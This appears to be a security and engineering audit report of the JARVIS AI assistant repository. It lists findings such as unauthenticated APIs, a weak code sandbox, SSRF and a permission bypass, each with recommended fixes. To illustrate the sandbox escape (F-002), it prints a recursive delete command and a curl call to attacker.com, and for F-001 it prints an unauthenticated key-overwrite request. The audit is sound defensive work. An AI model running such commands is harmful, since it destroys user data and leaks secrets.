# JARVIS — Complete Engineering Audit Report

**Audit Date:** 2026-11-23  
**Auditor:** Principal Software Architect / AI Systems Engineer  
**Repository:** https://github.com/PrathamGolhar/JARVIS  
**Branch:** `main` (commit `6b00368`)  
**Working Tree:** Clean — no uncommitted changes  

---

## Executive Assessment

JARVIS 2.0 is a genuinely ambitious personal AI assistant with a well-structured FastAPI backend, a React/TypeScript frontend, multi-provider AI routing, and real tool execution (web search, code sandbox, document generation, voice I/O). The architectural intent is sound, and many subsystems are individually competent.

However, **the system has significant gaps between its documented architecture and its actual implementation**, multiple security vulnerabilities ranging from severe to moderate, and meaningful reliability risks under production load. None of these block basic functionality, but several can lead to data exposure, unauthenticated escalation, or silent corruption in edge cases.

**Risk summary:**
- 🔴 **P0 (Critical):** 3 findings — unauthenticated API + sandbox escape vector + unvalidated permission_mode injection
- 🟠 **P1 (High):** 7 findings — SSRF gap, confirmation token store, secrets-in-.env API, path-traversal bypass, unbounded memory growth, synchronous I/O on async paths, missing rate limiting
- 🟡 **P2 (Medium):** 10 findings — session isolation, BM25 non-persistence, ModelRouter/Orchestrator disconnect, generator file accumulation, incomplete SSRF hostname resolution, etc.
- 🟢 **P3 (Low):** 8 findings — docs inaccuracies, dead code, missing tests, cosmetic issues

---

## 1. Subsystem Assessment

### 1.1 Backend Application (`backend/app/`)

| Subsystem | Status | Quality |
|---|---|---|
| FastAPI application bootstrap (`main.py`) | ✅ Operational | Good |
| Settings management (`settings.py`) | ✅ Operational | Good |
| Schemas (`schemas.py`) | ✅ Operational | Good |
| Orchestrator (`services/orchestrator.py`) | ✅ Operational | Adequate |
| AI Factory + Failover (`services/ai/factory.py`) | ✅ Operational | Good |
| ModelRouter (`services/ai/router.py`) | ⚠️ Disconnected | Unused in hot path |
| PlanningEngine (`services/agents/planner.py`) | ⚠️ Cosmetic | Keyword-only, no real planning |
| TaskGraph (`services/agents/task_graph.py`) | ⚠️ Orphaned | Never invoked from orchestrator |
| EventBus (`services/events/bus.py`) | ⚠️ Orphaned | No subscribers in production |
| ToolRegistry (`services/tools/registry.py`) | ✅ Operational | Good |
| Permissions / Capability Registry (`services/permissions.py`) | ⚠️ Disconnected | Not used by tool execution path |
| Code Sandbox (`services/coding/sandbox.py`) | ⚠️ Vulnerable | No OS-level isolation |
| File Tools (`services/tools/file_tools.py`) | ✅ Adequate | Traversal protection present |
| Memory Store (`services/memory/persistent_memory.py`) | ✅ Operational | Adequate |
| RAG Vector Store (`services/memory/vector_store.py`) | ⚠️ Limited | In-memory only, BM25 is O(N²) |
| Web Search (`services/tools/web_search.py`) | ✅ Operational | Resilient multi-tier |
| Web Reader (`services/tools/web_reader.py`) | ⚠️ Partial SSRF | DNS rebinding not covered |
| Researcher (`services/research/researcher.py`) | ✅ Operational | Good |
| Document Generation | ✅ Operational | Good |
| Settings API (`api/settings_api.py`) | 🔴 Vulnerable | Unauthenticated API key update |
| Files API (`api/files.py`) | ⚠️ Adequate | Traversal protection via `.name` |
| Chat API (`api/chat.py`) | ✅ Operational | Good |
| Speech API | ✅ Operational | Good |
| Health API | ✅ Operational | Good |
| Local Actions | ✅ Operational | Well allowlisted |
| Scheduler / Reminders | ✅ Operational | Adequate |
| Projects Manager | ✅ Operational | Adequate |
| Study Mode / Exam Prep | ✅ Operational | Adequate |

### 1.2 Frontend (`jarvis-frontend/`)

A React + TypeScript + Vite frontend. Component library is rich (30+ components). Key concerns: no authentication layer, all API calls are unauthenticated, state management spread across multiple approaches.

### 1.3 Infrastructure

| Item | Status |
|---|---|
| Docker multi-stage build | ✅ Functional |
| `docker-compose.yml` | ✅ Functional |
| CI/CD (`ci.yml`) | ✅ Functional |
| `start-dev.ps1` / `start-dev.sh` | ✅ Functional |
| `.dockerignore` | ✅ Present |
| `.gitignore` | ✅ Present |
| Lockfile (`package-lock.json`) | ✅ Present |
| `requirements.txt` (unpinned patch) | ⚠️ Ranges, not pinned |

---

## 2. Complete Finding Registry

---

### F-001 · P0 · Security Vulnerability — No Authentication on Any API Endpoint

**Category:** Confirmed Security Vulnerability  
**Affected Files:** `backend/app/main.py`, all `backend/app/api/*.py`  
**Function:** All API routes  

**Observed Implementation:**
```python
# main.py — no authentication middleware
app.add_middleware(CORSMiddleware, ...)
app.include_router(chat_router)
app.include_router(settings_router)   # includes API key update
app.include_router(local_actions_router)  # includes app launcher
```
Every API endpoint—including `/api/settings` (which writes API keys to `.env`), `/api/chat` (which executes code and tools), and `/api/files/download/{filename}` (which serves files)—is completely unauthenticated.

**Why It Is Problematic:**  
Any process or browser tab on the local machine, or any entity that can reach port 8765 (which Docker exposes as `0.0.0.0:8765`), can:
1. Read all uploaded files and conversation memory  
2. Execute arbitrary code in the sandbox  
3. Overwrite the user's `.env` with attacker-controlled API keys  
4. Launch desktop applications without user consent  

**Reproduction:**  
```bash
curl -X POST http://localhost:8765/api/settings \
  -H "Content-Type: application/json" \
  -d '{"geminiApiKey":"attacker-key"}'
```

**Expected Behavior:** At minimum, `localhost`-only binding in dev, session-based or token-based authentication.

**Recommended Correction:**
1. Bind backend to `127.0.0.1` by default (not `0.0.0.0`) in non-Docker dev mode.
2. Implement shared-secret `X-JARVIS-Token` header auth for all API routes.
3. Add `APIKeyHeader` FastAPI dependency on sensitive routes.

**Dependencies/Regression Risk:** Affects all routes. Frontend must send the token header.

**Test Required:** `test_api_requires_auth.py` — 401 when no token, 200 with valid token.

---

### F-002 · P0 · Security Vulnerability — Sandbox Has No OS-Level Isolation

**Category:** Confirmed Security Vulnerability  
**Affected File:** `backend/app/services/coding/sandbox.py` → `execute_sandboxed_code()`  

**Observed Implementation:**
```python
cmd = [sys.executable, "-I", "-u", str(script_file)]
proc = subprocess.run(cmd, ..., cwd=str(dir_path),
    env={"PYTHONIOENCODING": "utf-8", "PATH": os.environ.get("PATH", "")})
```
`-I` isolates site-packages and PYTHONPATH, but the subprocess runs as the **same OS user** with full filesystem access, network access, and the ability to `import subprocess` and execute arbitrary shell commands.

**Why It Is Problematic:**  
```python
# This "sandboxed" code escapes immediately:
import subprocess, os
os.system("del /f /s /q C:\\Users\\*")          # Windows
subprocess.run(["curl", "http://attacker.com"])  # exfiltrate
```
The subprocess has access to the entire home directory, can read the `.env` file (API keys), and can reach the network.

**Expected Behavior:** Code execution inside a Docker container, Windows Sandbox, or at minimum resource-limited subprocess with network blocking.

**Recommended Correction:**
1. Short-term: Block network with `no_proxy`; restrict `PATH` aggressively; block `import subprocess`, `import os`, `import socket` via AST pre-analysis.
2. Long-term: Run sandbox in a separate Docker container or use Pyodide (WASM).

**Test Required:** `test_sandbox_escape.py` — confirm `import subprocess; subprocess.run(["id"])` is blocked.

---

### F-003 · P0 · Security Vulnerability — Unauthenticated API Key Injection via Settings Endpoint

**Category:** Confirmed Security Vulnerability  
**Affected File:** `backend/app/api/settings_api.py` → `update_settings()`  

**Observed Implementation:**
```python
@router.post("", response_model=SettingsStatusResponse)
async def update_settings(request: SettingsUpdateRequest) -> SettingsStatusResponse:
    if request.gemini_api_key is not None and request.gemini_api_key.strip():
        settings.gemini_api_key = request.gemini_api_key
        _persist_env_key("JARVIS_GEMINI_API_KEY", request.gemini_api_key)
```
Any caller (unauthenticated) can POST to `/api/settings` and permanently overwrite the user's API keys in the `.env` file. The in-memory `settings` object is also mutated, changing which provider all subsequent requests use.

**Expected Behavior:** Settings mutation requires authentication.

---

### F-004 · P1 · Security Vulnerability — SSRF via DNS Rebinding in `web_reader.py`

**Category:** Potential Security Vulnerability  
**Affected File:** `backend/app/services/tools/web_reader.py` → `_is_private_host()`  

**Observed Implementation:**
```python
def _is_private_host(hostname: str) -> bool:
    if hostname.lower() in {"localhost", "127.0.0.1", "::1"}:
        return True
    try:
        ip = ipaddress.ip_address(hostname)
        return ip.is_private or ip.is_loopback ...
    except ValueError:
        return False   # domain names return False WITHOUT DNS resolution
```
If `hostname` is a domain name, `ipaddress.ip_address()` raises `ValueError`, and the function returns `False` (safe), without resolving the domain. An attacker can point a domain to `192.168.1.1` and bypass the check.

**Note:** `researcher.py` has better SSRF protection (uses `socket.gethostbyname()`) but `web_reader.py` does not.

**Recommended Correction:** Add `socket.gethostbyname()` DNS resolution in the `except ValueError` block and check the resolved IP.

---

### F-005 · P1 · Security Vulnerability — Pending Confirmation Tokens Are Global In-Process Dict (No Expiry)

**Category:** Confirmed Security Vulnerability  
**Affected File:** `backend/app/services/orchestrator.py` → `_PENDING_CONFIRMATIONS`  

**Observed Implementation:**
```python
_PENDING_CONFIRMATIONS: dict[str, PendingConfirmation] = {}
```
Tokens are stored in a module-level dict with no expiry time. Issues:
1. **No time limit** — a confirmation token created hours ago can still be executed.
2. **Memory leak** — if the user never confirms, the dict grows indefinitely.

**Recommended Correction:** Add `created_at` timestamp, enforce 60-second TTL, purge expired tokens on lookup.

---

### F-006 · P1 · Security Vulnerability — `permission_mode` Can Be Set to Arbitrary Strings

**Category:** Confirmed Security Vulnerability  
**Affected File:** `backend/app/api/settings_api.py` → `update_settings()`  

**Observed Implementation:**
```python
if request.permission_mode is not None:
    settings.permission_mode = request.permission_mode  # no validation
```
The sandbox checks only `== "read_only"`. Setting `permission_mode` to any other string (e.g., `"full_control"` or `"hacker"`) bypasses all confirmation gates.

**Recommended Correction:** Validate against `{"read_only", "assisted", "full_control"}` before persisting.

---

### F-007 · P1 · Architectural Concern — ModelRouter Is Completely Disconnected from the Orchestrator

**Category:** Architectural Concern  
**Affected Files:** `services/ai/router.py`, `services/orchestrator.py`  

The `orchestrator.py` calls `execute_with_failover()` from `factory.py` directly. The `ModelRouter` class is **never invoked** in the main orchestration path. The `TaskClassifier` logic is entirely bypassed.

**Impact:** All requests use a simple Gemini → Groq → OpenAI → Anthropic cascade regardless of task type, `max_tokens` is always 800.

---

### F-008 · P1 · Architectural Concern — TaskGraph and EventBus Are Orphaned

**Category:** Architectural Concern  
**Affected Files:** `services/agents/task_graph.py`, `services/events/bus.py`  

Both are well-implemented but no production code path creates a `TaskGraph` or invokes `event_bus.publish()`.

---

### F-009 · P1 · Bug — Synchronous Blocking I/O in Async FastAPI Handler

**Category:** Confirmed Defect  
**Affected Files:** `services/orchestrator.py`, `services/tools/web_search.py`, `services/research/researcher.py`  

All HTTP calls to AI providers and web search use the synchronous `requests` library, called from `async def chat()` without `run_in_executor`. This blocks the entire uvicorn event loop for 1–10 seconds per request.

**Recommended Correction:** Replace `requests` with `httpx.AsyncClient` or use `loop.run_in_executor()`.

---

### F-010 · P1 · Bug — No Rate Limiting on Any Endpoint

**Category:** Missing Capability / Reliability  

No rate limiting middleware exists. The `/api/chat` endpoint invokes expensive AI calls with no throttling, enabling cost amplification attacks.

**Recommended Correction:** Add `slowapi` or `fastapi-limiter` with limits per session ID.

---

### F-011 · P1 · Bug — Groq Primary and Fallback Model Names Are Swapped in Default Config

**Category:** Confirmed Defect  
**Affected Files:** `backend/app/settings.py`, `backend/.env.example`, `docker-compose.yml`  

`settings.py` defaults: primary=`openai/gpt-oss-20b` (smaller), fallback=`openai/gpt-oss-120b` (larger).  
`.env.example` and `docker-compose.yml`: primary=`openai/gpt-oss-120b`, fallback=`openai/gpt-oss-20b`.  
The defaults are inverted. Additionally, `openai/gpt-oss-*` model IDs may not be valid Groq model identifiers.

---

### F-012 · P2 · Bug — `inspect.signature` Hack in `chat.py` Is Fragile

**Category:** Confirmed Defect  
**Affected File:** `backend/app/api/chat.py` → lines 25–37  

Runtime `inspect.signature(run_orchestration)` introspection to support test mocks couples production code to test implementation details.

---

### F-013 · P2 · Security Concern — Generated Files Are Unauthenticated and Accumulate Indefinitely

**Category:** Reliability / Security  

100+ generated files found in `backend/data/generated/`. No eviction policy. Files from any session are served unauthenticated to any caller via `/api/files/download/{filename}`.

---

### F-014 · P2 · Bug — `PlanningEngine` Steps Are Pre-Completed at Creation Time

**Category:** Confirmed Defect  
**Affected File:** `services/agents/planner.py`  

Step 1 is always marked `"completed"` before execution begins. UI always shows step 1 done when the plan is delivered, which is misleading.

---

### F-015 · P2 · Bug — `permissions.py` Capability Registry Never Consulted by Tool Execution

**Category:** Architectural Concern  

`validate_tool_approval()` exists but `execute_tool_call()` never calls it. The registry is effectively dead code from the tool execution path.

---

### F-016 · P2 · Bug — RAG Vector Store Is In-Memory Only; Restarting Loses All Indexed Documents

**Category:** Missing Capability  

`LocalRAGVectorStore` is in-process only. On restart, all uploaded document indexes are lost.

---

### F-017 · P2 · Bug — `max_tokens=800` in Orchestrator Causes Truncation

**Category:** Confirmed Defect  
**Affected File:** `services/orchestrator.py` line 187  

800 tokens is frequently too small for research synthesis and code generation tasks.

---

### F-018 · P2 · Security — No Cross-Session Isolation in Memory Store

**Category:** Security / Bug  

`session_id` is a client-supplied UUID used directly as a database key with no verification of session ownership.

---

### F-019 · P3 · Documentation — `AGENTS.md` Describes Non-Existent Agents

**Category:** Documentation Inaccuracy  

Math Agent, Multi-Doc Agent, Computer Agent described in `AGENTS.md` do not exist in the codebase.

---

### F-020 · P3 · Quality — `requirements.txt` Uses Wide Version Ranges

**Category:** Improvement Opportunity  

No patch-level pinning. `ddgs>=9.16.0` with no upper bound is risky given frequent DDGS API changes.

---

### F-021 · P3 · Bug — Dockerfile `data` Directory Name Mismatch

**Category:** Confirmed Defect  

`mkdir /app/data/generated_files` but settings write to `/app/data/generated`.

---

### F-022 · P3 · Tests — Missing Security Regression Tests

**Category:** Missing Capability  

No tests for sandbox escape, permission_mode bypass, path traversal, SSRF bypass, or cross-session read.

---

### F-023 · P3 · Bug — `wakeWordEnabled` Is Always Hardcoded `True`

**Category:** Confirmed Defect  
**Affected File:** `api/settings_api.py` line 47  

`wakeWordEnabled=True` is hardcoded with no backing setting or env variable.

---

## 3. Summary Table

| ID | Priority | Category | Description |
|---|---|---|---|
| F-001 | P0 | Security | No authentication on any API |
| F-002 | P0 | Security | Sandbox has no OS-level isolation |
| F-003 | P0 | Security | Unauthenticated API key injection |
| F-004 | P1 | Security | SSRF via DNS rebinding in web_reader |
| F-005 | P1 | Security | Confirmation tokens have no TTL |
| F-006 | P1 | Security | permission_mode accepts arbitrary strings |
| F-007 | P1 | Architecture | ModelRouter disconnected from orchestrator |
| F-008 | P1 | Architecture | TaskGraph and EventBus are orphaned |
| F-009 | P1 | Bug | Blocking I/O on async paths |
| F-010 | P1 | Bug | No rate limiting |
| F-011 | P1 | Bug | Groq model names swapped in defaults |
| F-012 | P2 | Bug | inspect.signature hack in chat.py |
| F-013 | P2 | Security | Generated files unauthenticated & unbounded |
| F-014 | P2 | Bug | Planner steps pre-completed |
| F-015 | P2 | Architecture | Capability registry never consulted |
| F-016 | P2 | Bug | RAG store lost on restart |
| F-017 | P2 | Bug | max_tokens=800 causes truncation |
| F-018 | P2 | Security | No cross-session isolation |
| F-019 | P3 | Docs | AGENTS.md describes non-existent agents |
| F-020 | P3 | Quality | requirements.txt not pinned at patch level |
| F-021 | P3 | Bug | Dockerfile directory name mismatch |
| F-022 | P3 | Tests | Missing security regression tests |
| F-023 | P3 | Bug | wakeWordEnabled hardcoded to True |
